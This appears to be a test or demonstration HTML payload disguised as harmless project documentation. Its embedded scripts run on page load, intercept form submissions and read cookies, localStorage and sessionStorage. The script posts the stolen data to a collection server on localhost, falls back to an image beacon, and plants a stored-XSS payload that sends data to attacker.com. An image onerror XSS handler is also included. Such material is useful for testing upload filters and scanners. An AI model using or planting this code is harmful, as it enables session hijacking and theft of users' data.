<!DOCTYPE html>
<html>
<head>
    <title>Innocent Document</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>Project Documentation</h1>
    <p>This appears to be a normal HTML document...</p>
    
    <!-- MALICIOUS: Hidden script that will execute during "security scan" -->
    <script>
        // This script executes immediately when the HTML is processed
        console.log("üö® HTML PAYLOAD EXECUTED! üö®");
        console.log("Attack vector: HTML file with embedded JavaScript");
        
        // Steal form data if any forms exist
        const forms = document.querySelectorAll('form');
        if (forms.length > 0) {
            forms.forEach((form, index) => {
                console.log(`Form ${index} detected, installing keylogger...`);
                form.addEventListener('submit', function(e) {
                    const formData = new FormData(form);
                    console.log('üîì Form data intercepted:', Object.fromEntries(formData));
                });
            });
        }
        
        // Cookie theft
        if (document.cookie) {
            console.log('üç™ Cookies stolen:', document.cookie);
        }
        
        // Local storage theft
        const localData = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            localData[key] = localStorage.getItem(key);
        }
        console.log('üíæ Local storage compromised:', localData);
        
        // Send stolen data to attacker server
        const stolenData = {
            type: 'html_payload_execution',
            cookies: document.cookie,
            localStorage: localData,
            sessionStorage: Object.assign({}, sessionStorage),
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };
        
        fetch('http://localhost:8888/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(stolenData)
        }).then(() => {
            console.log('üì° HTML payload data transmitted successfully');
        }).catch(() => {
            console.log('‚ùå Direct transmission failed, using image method');
            const img = new Image();
            img.src = `http://localhost:8888/steal?data=${encodeURIComponent(btoa(JSON.stringify(stolenData)))}&source=html_payload`;
        });
        
        // Redirect attack (commented out to avoid disruption)
        // window.location.href = 'https://malicious-site.com/steal?data=' + btoa(JSON.stringify(localData));
        
        // Install persistent XSS
        localStorage.setItem('xss_payload', `
            <img src="x" onerror="
                console.log('üï∑Ô∏è Persistent XSS triggered!');
                fetch('https://attacker.com/collect', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'persistent_xss',
                        cookies: document.cookie,
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    })
                });
            ">
        `);
        
        console.log("üéØ HTML injection attack completed");
        console.log("üìã Vulnerability: File upload allows HTML with JavaScript");
        console.log("üíÄ Impact: XSS, Session Hijacking, Data Theft");
        
        // Visual indicator of compromise
        document.body.style.border = "3px solid red";
        setTimeout(() => {
            document.body.style.border = "";
        }, 3000);
        
    </script>
    
    <div>
        <h2>Features</h2>
        <ul>
            <li>Project management</li>
            <li>File sharing</li>
            <li>Team collaboration</li>
        </ul>
    </div>
    
    <!-- Another hidden attack vector -->
    <img src="invalid" onerror="console.log('üö® Image onerror XSS executed!');">
    
    <script>
        // Secondary payload
        setTimeout(() => {
            console.log("üîÑ Secondary payload activated");
            // Simulate background data collection
            setInterval(() => {
                if (Math.random() < 0.1) { // 10% chance every interval
                    console.log("üì° Background data transmission...");
                }
            }, 10000);
        }, 5000);
    </script>
</body>
</html>